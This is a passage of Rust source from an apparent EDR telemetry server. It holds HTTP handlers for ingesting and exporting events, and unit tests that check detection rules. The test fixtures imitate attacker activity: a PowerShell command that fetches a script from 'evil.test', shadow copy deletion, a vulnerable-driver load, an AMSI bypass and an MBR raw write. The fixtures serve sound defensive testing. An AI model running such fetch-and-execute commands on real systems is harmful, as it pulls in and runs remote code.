        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

#[derive(Debug, Deserialize)]
pub struct EdrEventsQuery {
    pub limit: Option<usize>,
    pub event_type: Option<String>,
    pub machine_id: Option<String>,
    pub sysops: Option<bool>,
    pub q: Option<String>,
}

#[derive(Debug, Deserialize)]
pub struct EdrEventsExportQuery {
    pub event_type: Option<String>,
    pub machine_id: Option<String>,
}

/// Handler for POST /api/v1/edr/telemetry/events (dashboard route; supports Brotli & plain JSON).
pub async fn handle_edr_telemetry_events(
    State(app): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
    body: axum::body::Bytes,
) -> axum::response::Response {
    let brotli = headers
        .get("content-encoding")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v.eq_ignore_ascii_case("br") || v.eq_ignore_ascii_case("brotli"));
    let store = Arc::clone(&app.edr_telemetry);
    let events = Arc::clone(&app.events);
    let res = tokio::task::spawn_blocking(move || {
        let json = decode_events_body(&body, brotli).map_err(|e| (axum::http::StatusCode::BAD_REQUEST, e))?;
        let batch: EdrEventBatch =
            serde_json::from_slice(&json).map_err(|e| (axum::http::StatusCode::BAD_REQUEST, format!("bad JSON: {e}")))?;
        Ok::<_, (axum::http::StatusCode, String)>(ingest_edr_events(&store, &events, &batch))
    })
    .await;
    match res {
        Ok(Ok(v)) => Json(v).into_response(),
        Ok(Err((st, e))) => (st, Json(serde_json::json!({"status": "error", "error": e}))).into_response(),
        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Handler for GET /api/v1/edr/telemetry/events
pub async fn handle_get_edr_events(
    State(app): State<Arc<AppState>>,
    Query(query): Query<EdrEventsQuery>,
) -> axum::response::Response {
    let limit = query.limit.unwrap_or(200).min(5000);
    let store = Arc::clone(&app.edr_telemetry);
    let et = query.event_type;
    let mach = query.machine_id;
    let sysops = query.sysops.unwrap_or(false);
    let q = query.q;
    match tokio::task::spawn_blocking(move || {
        store.get_edr_events(limit, et.as_deref(), mach.as_deref(), sysops, q.as_deref())
    })
    .await
    {
        Ok(items) => Json(serde_json::json!({
            "total": items.len(),
            "events": items
        }))
        .into_response(),
        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Handler for GET /api/v1/edr/telemetry/events/export (full lossless NDJSON download).
pub async fn handle_export_edr_events(
    State(app): State<Arc<AppState>>,
    Query(query): Query<EdrEventsExportQuery>,
) -> axum::response::Response {
    let store = Arc::clone(&app.edr_telemetry);
    let et = query.event_type.filter(|s| !s.trim().is_empty());
    let mach = query.machine_id.filter(|s| !s.trim().is_empty());
    let file_name = match &mach {
        Some(m) => {
            let safe: String = m
                .chars()
                .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_')
                .take(64)
                .collect();
            format!("attachment; filename=\"edr_events_{safe}.jsonl\"")
        }
        None => "attachment; filename=\"edr_events.jsonl\"".to_string(),
    };
    let result = tokio::task::spawn_blocking(move || store.export_edr_events(et.as_deref(), mach.as_deref())).await;
    match result {
        Ok(Ok((body, _))) => (
            [
                (axum::http::header::CONTENT_TYPE, "application/x-ndjson".to_string()),
                (axum::http::header::CONTENT_DISPOSITION, file_name),
            ],
            body,
        )
            .into_response(),
        Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Handler for GET /api/v1/edr/telemetry/system-reports
pub async fn handle_get_system_reports(
    State(app): State<Arc<AppState>>,
    Query(query): Query<TelemetryQuery>,
) -> impl IntoResponse {
    let limit = query.limit.unwrap_or(50).min(500);
    let items = app.edr_telemetry.get_system_reports(limit);
    Json(serde_json::json!({
        "total": items.len(),
        "reports": items
    }))
}

/// Handler for GET /api/v1/edr/telemetry/killchain/export: the kill chain training
/// set as JSON lines (`train_kc_hybrid.py <file>` reads it). `?machine=<id>`: that
/// machine's own kill chain, in the order it happened there.
pub async fn handle_export_killchain(
    State(app): State<Arc<AppState>>,
    Query(query): Query<KillchainExportQuery>,
) -> axum::response::Response {
    let store = Arc::clone(&app.edr_telemetry);
    let machine = query.machine.filter(|m| !m.is_empty());
    // Only file-name-safe characters of the machine id go into the download name.
    let file_name = match &machine {
        Some(m) => {
            let safe: String = m.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_').take(64).collect();
            format!("attachment; filename=\"killchain_{safe}.jsonl\"")
        }
        None => "attachment; filename=\"killchain_events.jsonl\"".to_string(),
    };
    let result = tokio::task::spawn_blocking(move || store.export_killchain(machine.as_deref())).await;
    match result {
        Ok(Ok((body, _))) => (
            [
                (axum::http::header::CONTENT_TYPE, "application/x-ndjson".to_string()),
                (axum::http::header::CONTENT_DISPOSITION, file_name),
            ],
            body,
        )
            .into_response(),
        Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
        Err(e) => (axum::http::StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn killchain_uploads_merge_by_key() {
        let p = std::env::temp_dir().join(format!("edr_db_{}_killchain.db", std::process::id()));
        let _ = std::fs::remove_file(&p);
        let store = EdrTelemetryStore::open(&p);
        let rec = |key: &str, count| KillchainRecord {
            key: key.into(),
            date: "20261114".into(),
            time: "01:02:03.004".into(),
            exe: "%systemroot%\\system32\\svchost.exe".into(),
            event: "LLE_FILE_MAP_READ".into(),
            details: " [File: C:\\x.dll]".into(),
            raw: serde_json::json!({"accessMask": 2}),
            count,
        };
        let first = KillchainBatch {
            machine_id: "m1".into(),
            records: vec![rec("00000000000000aa", 3), rec("not-a-key", 1)],
            counts: Default::default(),
        };
        assert_eq!(store.ingest_killchain(&first).unwrap(), (1, 0), "invalid keys are dropped");
        let second = KillchainBatch {
            machine_id: "m2".into(),
            records: vec![rec("00000000000000aa", 2), rec("00000000000000bb", 1)],
            counts: [("00000000000000aa".to_string(), 5)].into(),
        };
        assert_eq!(store.ingest_killchain(&second).unwrap(), (1, 1));
        assert_eq!(store.killchain_totals(), (2, 3 + 2 + 5 + 1));
        let (body, n) = store.export_killchain(None).unwrap();
        assert_eq!(n, 2);
        let first_row: serde_json::Value =
            serde_json::from_str(std::str::from_utf8(&body).unwrap().lines().next().unwrap()).unwrap();
        assert_eq!(first_row["event"], "LLE_FILE_MAP_READ");
        assert_eq!(first_row["raw"]["accessMask"], 2);
        assert_eq!(first_row["machines"], 2, "seen on two machines");
        assert_eq!(first_row["machine_id"], "m1", "the first event is kept");

        // Per machine: m2 saw "aa" 2 + 5 times and "bb" once, m1 "aa" 3 times.
        let machines = store.killchain_machines().unwrap();
        let m2 = machines.iter().find(|m| m["machine_id"] == "m2").unwrap();
        assert_eq!((m2["shapes"].as_u64(), m2["events"].as_u64()), (Some(2), Some(8)));
        let (body, n) = store.export_killchain(Some("m2")).unwrap();
        assert_eq!(n, 2);
        let rows: Vec<serde_json::Value> =
            std::str::from_utf8(&body).unwrap().lines().map(|l| serde_json::from_str(l).unwrap()).collect();
        let aa = rows.iter().find(|r| r["key"] == "00000000000000aa").unwrap();
        assert_eq!(aa["count"], 7, "m2's own count");
        assert_eq!(aa["count_all"], 10);
        assert_eq!(aa["machine_id"], "m2");
        assert_eq!(store.export_killchain(Some("nobody")).unwrap().1, 0);
        drop(store);
        let _ = std::fs::remove_file(&p);
    }

    #[test]
    fn killchain_body_is_bounded() {
        assert!(killchain_body(b"{}", false).is_ok());
        assert!(killchain_body(b"not brotli", true).is_err());
    }

    fn report(source: &str, detection: &str, risk_score: f32, indicators: &[&str]) -> BehaviorTelemetryPayload {
        BehaviorTelemetryPayload {
            machine_id: "m".to_string(),
            timestamp: 0,
            pid: 1,
            gid: 0,
            process_name: "p.exe".to_string(),
            exe_path: r"C:\p.exe".to_string(),
            command_line: String::new(),
            sha256: String::new(),
            parent_pid: None,
            parent_name: None,
            detection: detection.to_string(),
            source: source.to_string(),
            risk_score,
            indicators: indicators.iter().map(|s| s.to_string()).collect(),
            ops_summary: None,
            details: serde_json::Value::Null,
        }
    }

    #[test]
    fn sigma_matches_are_graded_by_their_level() {
        let sigma = |score| report("sigma_event_log", "Sigma.Some.Rule", score, &["Sigma Level: x"]);
        // critical / high: malicious
        assert_eq!(behavior_severity(&sigma(1.0)), (true, true));
        assert_eq!(behavior_severity(&sigma(0.85)), (true, true));
        // medium / low: suspicious, not malicious
        assert_eq!(behavior_severity(&sigma(0.6)), (false, true));
        assert_eq!(behavior_severity(&sigma(0.3)), (false, true));
    }

    #[test]
    fn a_named_detection_from_any_other_source_is_malicious() {
        assert!(behavior_severity(&report("openedr_detnotif", "MLE_GODMODE_ACTIVITY", 1.0, &[])).0);
        // Even with a low score: the agent already acted on the verdict.
        assert!(behavior_severity(&report("ransomware", "Ransom.Generic", 0.1, &[])).0);
    }

    #[test]
    fn reports_without_a_detection_follow_the_score_and_the_indicators() {
        assert_eq!(behavior_severity(&report("generic", "", 0.1, &[])), (false, false));
        assert_eq!(behavior_severity(&report("generic", "Clean", 0.1, &[])), (false, false));
        assert_eq!(behavior_severity(&report("generic", "", 0.5, &[])), (false, true));
        assert_eq!(behavior_severity(&report("generic", "", 0.1, &["x"])), (false, true));
        assert_eq!(behavior_severity(&report("generic", "", 0.9, &[])), (true, true));
    }

    fn tmp_db(name: &str) -> std::path::PathBuf {
        let p = std::env::temp_dir().join(format!("edr_db_{}_{name}.db", std::process::id()));
        for ext in ["", "-wal", "-shm"] {
            let _ = std::fs::remove_file(format!("{}{ext}", p.display()));
        }
        p
    }

    fn flow(dst_ip: &str) -> NetworkFlowRecord {
        NetworkFlowRecord {
            timestamp: 0,
            pid: 7,
            process_name: "Net.exe".to_string(),
            src_ip: "10.0.0.1".to_string(),
            src_port: 5000,
            dst_ip: dst_ip.to_string(),
            dst_port: 443,
            protocol: "TCP".to_string(),
            hostname: None,
            dns_query: None,
            url: None,
            http_method: None,
            ja3: None,
            ja3s: None,
        }
    }

    #[test]
    fn history_survives_a_restart_and_searches_past_the_memory_window() {
        let path = tmp_db("restart");
        {
            let store = EdrTelemetryStore::open(&path);
            let events = EventLog::new(false);
            let mut old = report("generic", "", 0.9, &[]);
            old.process_name = "OldDropper.exe".to_string();
            ingest_behavior(&store, &events, old);
            for _ in 0..MAX_STORED_BEHAVIORS {
                ingest_behavior(&store, &events, report("generic", "", 0.1, &[]));
            }
            store.add_flows("m", &[flow("1.2.3.4"), flow("5.6.7.8")]);
            store.add_threat(&ThreatReport {
                sha256: "ab".repeat(32),
                file_name: "x.exe".to_string(),
                original_path: r"C:\x.exe".to_string(),
                detection: "Trojan.X".to_string(),
                source: "edr".to_string(),
                pid: None,
                details: serde_json::Value::Null,
            });
            // The first behavior has left the memory window but a search still finds it.
            assert!(store.inner.read().unwrap().behaviors.iter().all(|b| b.process_name != "OldDropper.exe"));
            let found = store.get_behaviors(10, None, Some("olddropper"));
            assert_eq!(found.len(), 1);
            assert_eq!(found[0].verdict, "malicious");
        }

        let store = EdrTelemetryStore::open(&path);
        let stats = store.get_stats();
        let total = MAX_STORED_BEHAVIORS as u64 + 1;
        assert_eq!(
            (stats.total_behaviors, stats.malicious_behaviors, stats.clean_behaviors, stats.total_flows, stats.total_threats),
            (total, 1, total - 1, 2, 1)
        );
        assert_eq!(store.get_behaviors(5, None, None).len(), 5);
        assert_eq!(store.get_behaviors(5, Some("malicious"), None).len(), 1);
        let flows = store.get_flows(10, None);
        assert_eq!(flows.iter().map(|f| f.dst_ip.as_str()).collect::<Vec<_>>(), ["5.6.7.8", "1.2.3.4"]);
        assert_eq!(store.get_flows(10, Some("5.6.7")).len(), 1);
        assert_eq!(store.get_threats(10)[0].detection, "Trojan.X");

        // New records continue the ids after the stored ones.
        let before = store.get_behaviors(1, None, None)[0].id;
        store.add_behavior(report("generic", "", 0.1, &[]), "clean".to_string(), None);
        assert!(store.get_behaviors(1, None, None)[0].id > before);
    }

    #[test]
    fn ingest_counts_a_medium_sigma_match_as_suspicious() {
        let store = EdrTelemetryStore::new();
        let events = EventLog::new(false);
        let body = ingest_behavior(&store, &events, report("sigma_event_log", "Sigma.Some.Rule", 0.6, &["Sigma Level: medium"]));
        assert_eq!(body["verdict"], "suspicious");
        assert_eq!(body["need_sample"], false);
        let stats = store.get_stats();
        assert_eq!((stats.malicious_behaviors, stats.suspicious_behaviors, stats.clean_behaviors), (0, 1, 0));
    }

    #[test]
    fn lossless_edr_events_and_system_reports_persist_and_search_without_dedupe() {
        let path = tmp_db("lossless_events");
        {
            let store = EdrTelemetryStore::open(&path);
            let events = EventLog::new(false);
            let dup = EdrEventRecord {
                timestamp: 1700000001,
                time_iso: "2026-11-25T10:00:01Z".to_string(),
                event_type: "LLE_FILE_CREATE".to_string(),
                pid: 4242,
                process_name: "notepad.exe".to_string(),
                exe_path: r"C:\Windows\System32\notepad.exe".to_string(),
                details: Some(r"[File: C:\Users\alice\doc.txt]".to_string()),
                raw: serde_json::json!({
                    "file": { "path": r"C:\Users\alice\doc.txt", "sha256": "deadbeef" },
                    "kernelStackSymbols": "ntoskrnl.exe!NtCreateFile+0x1"
                }),
            };
            let batch = EdrEventBatch {
                machine_id: "machine-1".to_string(),
                events: vec![
                    dup.clone(),
                    dup,
                    EdrEventRecord {
                        timestamp: 1700000002,
                        time_iso: "2026-11-25T10:00:02Z".to_string(),
                        event_type: "AGENT_START".to_string(),
                        pid: 100,
                        process_name: "edrsvc.exe".to_string(),
                        exe_path: r"C:\Program Files\HydraDragonAntivirus\OpenEDR\edrsvc.exe".to_string(),
                        details: Some("service started".to_string()),
                        raw: serde_json::json!({"version": "1.2"}),
                    },
                ],
            };
            let resp = ingest_edr_events(&store, &events, &batch);
            assert_eq!(resp["ingested"], 3);

            // NetworkFlowRecord carries dns_query, url, http_method cleanly
        let mut f = flow("93.184.216.34");
            f.dns_query = Some("example.org".to_string());
            f.url = Some("https://example.org/payload.exe".to_string());
            f.http_method = Some("GET".to_string());
            f.ja3 = Some("e7d705a3286e19ea42f587b344ee6865".to_string());
            f.ja3s = Some("ec74a5c51106f0419184d0dd08905735".to_string());
            store.add_flows("machine-1", &[f]);

            // Phase 2 raw event: ScriptBlock + PE Hashes
            let ps_ev = EdrEventRecord {
                timestamp: 1700000004,
                time_iso: "2026-11-25T10:00:04Z".to_string(),
                event_type: "SCRIPT_BLOCK_ACTIVITY".to_string(),
                pid: 888,
                process_name: "powershell.exe".to_string(),
                exe_path: r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe".to_string(),
                details: Some("ScriptBlockText=Invoke-WebRequest".to_string()),
                raw: serde_json::json!({
                    "ScriptBlockText": "Invoke-WebRequest https://evil.test/a.ps1",
                    "hashes": { "md5": "00112233445566778899aabbccddeeff", "imphash": "11223344556677889900aabbccddeeff" }
                }),
            };
            ingest_edr_events(
                &store,
                &events,
                &EdrEventBatch {
                    machine_id: "machine-1".to_string(),
                    events: vec![ps_ev],
                },
            );

            // ingest_system_report stores system_reports + AGENT_KEEPALIVE
            let sys_resp = ingest_system_report(
                &store,
                &events,
                &serde_json::json!({
                    "machine_id": "machine-1",
                    "timestamp": "2026-11-25T10:00:05Z",
                    "hostname": "WS-01",
                    "os_version": "Windows 11",
                    "monitored_processes_count": 42,
                    "rootkit_findings_count": 0,
                    "processes": []
                }),
            );
            assert_eq!(sys_resp["status"], "ok");
        }

        // Reopen DB and verify everything survived with exact totals
        let store = EdrTelemetryStore::open(&path);
        let stats = store.get_stats();
        assert_eq!(stats.total_events, 5, "2 duplicate LLE + AGENT_START + SCRIPT_BLOCK_ACTIVITY + AGENT_KEEPALIVE");
        assert_eq!(stats.total_sysops, 2, "AGENT_START + AGENT_KEEPALIVE");
        assert_eq!(stats.total_system_reports, 1);

        let all = store.get_edr_events(20, None, None, false, None);
        assert_eq!(all.len(), 5);
        assert_eq!(store.get_edr_events(20, Some("LLE_FILE_CREATE"), None, false, None).len(), 2);
        assert_eq!(store.get_edr_events(20, Some("LLE_FILE_CREATE,SCRIPT_BLOCK_ACTIVITY"), None, false, None).len(), 3);
        assert_eq!(store.get_edr_events(20, None, None, true, None).len(), 2);
        assert_eq!(store.get_edr_events(20, None, None, false, Some("deadbeef")).len(), 2);
        assert_eq!(store.get_edr_events(20, None, None, false, Some("11223344556677889900aabbccddeeff")).len(), 1);
        assert_eq!(store.get_edr_events(20, None, None, false, Some("invoke-webrequest")).len(), 1);

        let (exported, n) = store.export_edr_events(None, Some("machine-1")).unwrap();
        assert_eq!(n, 5);
        assert_eq!(std::str::from_utf8(&exported).unwrap().lines().count(), 5);

        let flows = store.get_flows(10, Some("e7d705a3286e19ea42f587b344ee6865"));
        assert_eq!(flows.len(), 1);
        assert_eq!(flows[0].dns_query.as_deref(), Some("example.org"));
        assert_eq!(flows[0].http_method.as_deref(), Some("GET"));
        assert_eq!(flows[0].ja3s.as_deref(), Some("ec74a5c51106f0419184d0dd08905735"));

        let reports = store.get_system_reports(10);
        assert_eq!(reports.len(), 1);
        assert_eq!(reports[0].hostname, "WS-01");
        assert_eq!(reports[0].monitored_processes_count, 42);
    }

    #[test]
    fn graded_edr_telemetry_rule_respects_risk_score() {
        let med = report("edr_telemetry_rule", "EDR.FileDownload.HighRiskMotwPayload", 0.60, &["MITRE:T1566.002"]);
        assert_eq!(behavior_severity(&med), (false, true));

        let high = report("edr_telemetry_rule", "EDR.NamedPipe.KnownMaliciousC2OrExploit", 0.85, &["MITRE:T1071"]);
        assert_eq!(behavior_severity(&high), (true, true));

        let srv_crit = report("server_telemetry_rule", "Server.EDR.ProcessTampering", 1.00, &[]);
        assert_eq!(behavior_severity(&srv_crit), (true, true));
    }

    #[test]
    fn ingest_edr_events_flags_process_tampering_shadow_delete_and_byovd() {
        let store = EdrTelemetryStore::new();
        let events = EventLog::new(false);
        let batch = EdrEventBatch {
            machine_id: "machine-srv-rules".to_string(),
            events: vec![
                EdrEventRecord {
                    timestamp: 1700000100,
                    time_iso: "2026-11-26T00:00:00Z".to_string(),
                    event_type: "PROCESS_TAMPERING".to_string(),
                    pid: 5100,
                    process_name: "svchost.exe".to_string(),
                    exe_path: r"C:\Temp\svchost.exe".to_string(),
                    details: Some("Entrypoint mismatch".to_string()),
                    raw: serde_json::json!({
                        "technique": "process_hollowing",
                        "reason": "PE header mismatch",
                        "hashes": { "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000101,
                    time_iso: "2026-11-26T00:00:01Z".to_string(),
                    event_type: "SHADOW_COPY_DELETE".to_string(),
                    pid: 5101,
                    process_name: "vssadmin.exe".to_string(),
                    exe_path: r"C:\Windows\System32\vssadmin.exe".to_string(),
                    details: Some("Shadow copy ID {1} deleted".to_string()),
                    raw: serde_json::json!({}),
                },
                EdrEventRecord {
                    timestamp: 1700000102,
                    time_iso: "2026-11-26T00:00:02Z".to_string(),
                    event_type: "LLE_DRIVER_LOAD".to_string(),
                    pid: 4,
                    process_name: "System".to_string(),
                    exe_path: "System".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "file": { "rawPath": r"\SystemRoot\System32\drivers\iqvw64e.sys" }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000103,
                    time_iso: "2026-11-26T00:00:03Z".to_string(),
                    event_type: "LLE_NAMED_PIPE_SERVER_CREATE".to_string(),
                    pid: 5102,
                    process_name: "beacon.exe".to_string(),
                    exe_path: r"C:\Temp\beacon.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "file": { "rawPath": r"\Device\NamedPipe\msagent_4242" }
                    }),
                },
            ],
        };
        let resp = ingest_edr_events(&store, &events, &batch);
        assert_eq!(resp["ingested"], 4);

        let behaviors = store.get_behaviors(20, None, None);
        assert!(behaviors.iter().any(|b| b.detection == "Server.EDR.ProcessTampering"));
        assert!(behaviors.iter().any(|b| b.detection == "Server.EDR.ShadowCopyDeletion"));
        assert!(behaviors.iter().any(|b| b.detection == "Server.EDR.BYOVDVulnerableDriver"));
        assert!(behaviors.iter().any(|b| b.detection == "Server.EDR.MaliciousNamedPipe"));
    }

    #[test]
    fn ingest_flows_flags_malicious_ja3_and_ignores_benign_ja3() {
        let store = EdrTelemetryStore::new();
        let events = EventLog::new(false);
        let mut malicious = flow("198.51.100.50");
        malicious.ja3 = Some("eb88d0b3e1961a0562f006e5ce2a0b87".to_string());
        let mut benign = flow("93.184.216.34");
        benign.ja3 = Some("0123456789abcdef0123456789abcdef".to_string());

        ingest_flows(
            &store,
            &events,
            &NetworkFlowBatch {
                machine_id: "machine-tls-rules".to_string(),
                flows: vec![malicious, benign],
            },
        );
        let behaviors = store.get_behaviors(20, None, None);
        assert_eq!(behaviors.len(), 1);
        assert_eq!(behaviors[0].detection, "Server.TLS.CobaltStrike.MalleableC2");
        assert_eq!(behaviors[0].verdict, "malicious");
    }

    #[test]
    fn ingest_edr_events_flags_sanctum_detections_without_benign_etw_ti_fp() {
        let store = EdrTelemetryStore::new();
        let events = EventLog::new(false);
        let batch = EdrEventBatch {
            machine_id: "machine-sanctum-rules".to_string(),
            events: vec![
                EdrEventRecord {
                    timestamp: 1700000200,
                    time_iso: "2026-11-26T00:05:00Z".to_string(),
                    event_type: "SANCTUM_GHOST_HUNT".to_string(),
                    pid: 6200,
                    process_name: "loader.exe".to_string(),
                    exe_path: r"C:\Temp\loader.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "syscall_name": "NtAllocateVirtualMemory",
                        "address": 140735275417600u64,
                        "hex_payload": "4c8bd1b818000000"
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000201,
                    time_iso: "2026-11-26T00:05:01Z".to_string(),
                    event_type: "SANCTUM_AMSI_BYPASS".to_string(),
                    pid: 6201,
                    process_name: "ps_bypass.exe".to_string(),
                    exe_path: r"C:\Temp\ps_bypass.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "function_name": "AmsiScanBuffer",
                        "offending_address": 140711111111111u64
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000202,
                    time_iso: "2026-11-26T00:05:02Z".to_string(),
                    event_type: "LLE_DRIVER_LOAD".to_string(),
                    pid: 6202,
                    process_name: "dropper.exe".to_string(),
                    exe_path: r"C:\Temp\dropper.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "subType": "HVCI_BLOCK",
                        "driver": {
                            "image": r"\SystemRoot\System32\drivers\iqvw64e.sys",
                            "action": "BLOCK"
                        }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000203,
                    time_iso: "2026-11-26T00:05:03Z".to_string(),
                    event_type: "SANCTUM_ETW_BLINDING".to_string(),
                    pid: 6203,
                    process_name: "sanctum_ppl_runner.exe".to_string(),
                    exe_path: "sanctum_ppl_runner.exe".to_string(),
                    details: Some("ETW:TI session interrupted".to_string()),
                    raw: serde_json::json!({}),
                },
                EdrEventRecord {
                    timestamp: 1700000204,
                    time_iso: "2026-11-26T00:05:04Z".to_string(),
                    event_type: "SANCTUM_ETW_TI".to_string(),
                    pid: 6204,
                    process_name: "injector.exe".to_string(),
                    exe_path: r"C:\Temp\injector.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "data": {
                            "EtwThreatIntelligence": {
                                "function": "NtAllocateVirtualMemory",
                                "event_name": "ALLOCVM_REMOTE",
                                "remote": true,
                                "suspicious": true
                            }
                        }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000205,
                    time_iso: "2026-11-26T00:05:05Z".to_string(),
                    event_type: "SANCTUM_ETW_TI".to_string(),
                    pid: 6205,
                    process_name: "svchost.exe".to_string(),
                    exe_path: r"C:\Windows\System32\svchost.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "data": {
                            "EtwThreatIntelligence": {
                                "function": "NtAllocateVirtualMemory",
                                "event_name": "ALLOCVM_LOCAL",
                                "remote": false,
                                "suspicious": false
                            }
                        }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000206,
                    time_iso: "2026-11-26T00:05:06Z".to_string(),
                    event_type: "VSS_SHADOW_COPY_DELETED".to_string(),
                    pid: 6206,
                    process_name: "vssvc.exe".to_string(),
                    exe_path: r"C:\Windows\System32\vssvc.exe".to_string(),
                    details: Some("VolumeName=C:".to_string()),
                    raw: serde_json::json!({ "VolumeName": "C:" }),
                },
            ],
        };
        let resp = ingest_edr_events(&store, &events, &batch);
        assert_eq!(resp["ingested"], 7);

        let behaviors = store.get_behaviors(20, None, None);
        assert!(behaviors.iter().any(|b| b.detection == "Server.Sanctum.DirectSyscallGhostHunt"));
        assert!(behaviors.iter().any(|b| b.detection == "Server.Sanctum.AmsiBypass"));
        assert!(behaviors.iter().any(|b| b.detection == "Server.Sanctum.HvciDriverBlocked"));
        assert!(behaviors.iter().any(|b| b.detection == "Server.Sanctum.EtwTiBlinding"));
        assert!(behaviors.iter().any(|b| b.detection == "Server.Sanctum.EtwThreatIntel"));
        assert!(behaviors.iter().any(|b| b.pid == 6206 && b.detection == "Server.EDR.ShadowCopyDeletion"));
        assert!(!behaviors.iter().any(|b| b.pid == 6205 && b.detection == "Server.Sanctum.EtwThreatIntel"));
    }

    #[test]
    fn ingest_edr_events_flags_mbrfilter_and_hypervisor_and_driver_tamper() {
        let store = EdrTelemetryStore::new();
        let events = EventLog::new(false);
        let batch = EdrEventBatch {
            machine_id: "machine-mbr-hv".to_string(),
            events: vec![
                EdrEventRecord {
                    timestamp: 1700000300,
                    time_iso: "2026-11-26T00:06:00Z".to_string(),
                    event_type: "MBR_SECTOR0_RAW_WRITE".to_string(),
                    pid: 7100,
                    process_name: "wiper.exe".to_string(),
                    exe_path: r"C:\Temp\wiper.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "disk": r"\\.\PhysicalDrive0",
                        "sector": 0,
                        "mbrAlert": r"DISK:0|C:\Temp\wiper.exe"
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000301,
                    time_iso: "2026-11-26T00:06:01Z".to_string(),
                    event_type: "LLE_DISK_RAW_WRITE_ACCESS".to_string(),
                    pid: 7101,
                    process_name: "defrag.exe".to_string(),
                    exe_path: r"C:\Windows\System32\defrag.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({ "path": r"\\.\PhysicalDrive0", "sector": 2048 }),
                },
                EdrEventRecord {
                    timestamp: 1700000302,
                    time_iso: "2026-11-26T00:06:02Z".to_string(),
                    event_type: "LLE_DEVICE_IOCTL".to_string(),
                    pid: 7102,
                    process_name: "rk_msr.exe".to_string(),
                    exe_path: r"C:\Temp\rk_msr.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "owlyHook": { "eventType": 65 },
                        "owlyHv": { "timestamp": 133800000000000000u64, "context": 0xC0000082u64 }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000303,
                    time_iso: "2026-11-26T00:06:03Z".to_string(),
                    event_type: "LLE_DEVICE_IOCTL".to_string(),
                    pid: 4,
                    process_name: "System".to_string(),
                    exe_path: "System".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "owlyHook": { "eventType": 65 },
                        "owlyHv": { "timestamp": 133800000000000000u64, "context": 0xC0000082u64 }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000304,
                    time_iso: "2026-11-26T00:06:04Z".to_string(),
                    event_type: "MLE_HYPERVISOR_MSR_TAMPER".to_string(),
                    pid: 7104,
                    process_name: "rk_efer.exe".to_string(),
                    exe_path: r"C:\Temp\rk_efer.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({ "targetMsr": 0xC0000080u64 }),
                },
                EdrEventRecord {
                    timestamp: 1700000305,
                    time_iso: "2026-11-26T00:06:05Z".to_string(),
                    event_type: "LLE_DEVICE_IOCTL".to_string(),
                    pid: 7105,
                    process_name: "ept_probe.exe".to_string(),
                    exe_path: r"C:\Temp\ept_probe.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({
                        "owlyHook": { "eventType": 0x10 },
                        "owlyHv": { "timestamp": 133800000000000000u64, "context": 7u64, "memoryAddress": 0x2000u64 }
                    }),
                },
                EdrEventRecord {
                    timestamp: 1700000306,
                    time_iso: "2026-11-26T00:06:06Z".to_string(),
                    event_type: "DRIVER_UNLOADED".to_string(),
                    pid: 7106,
                    process_name: "services.exe".to_string(),
                    exe_path: "services.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({ "driver_path": r"C:\Windows\System32\drivers\MBRFilter.sys" }),
                },
                EdrEventRecord {
                    timestamp: 1700000307,
                    time_iso: "2026-11-26T00:06:07Z".to_string(),
                    event_type: "DRIVER_UNLOADED".to_string(),
                    pid: 7107,
                    process_name: "services.exe".to_string(),
                    exe_path: "services.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({ "driver_path": r"C:\Windows\System32\drivers\hyperhv.sys" }),
                },
                EdrEventRecord {
                    timestamp: 1700000308,
                    time_iso: "2026-11-26T00:06:08Z".to_string(),
                    event_type: "DRIVER_UNLOADED".to_string(),
                    pid: 7108,
                    process_name: "services.exe".to_string(),
                    exe_path: "services.exe".to_string(),
                    details: None,
                    raw: serde_json::json!({ "driver_path": r"C:\Windows\System32\drivers\RedDbgDrv.sys" }),
                },
            ],
        };
        let resp = ingest_edr_events(&store, &events, &batch);
        assert_eq!(resp["ingested"], 9);

        let behaviors = store.get_behaviors(30, None, None);
        assert!(behaviors.iter().any(|b| b.pid == 7100 && b.detection == "Server.EDR.MbrSector0RawWrite"));
        assert!(!behaviors.iter().any(|b| b.pid == 7101));
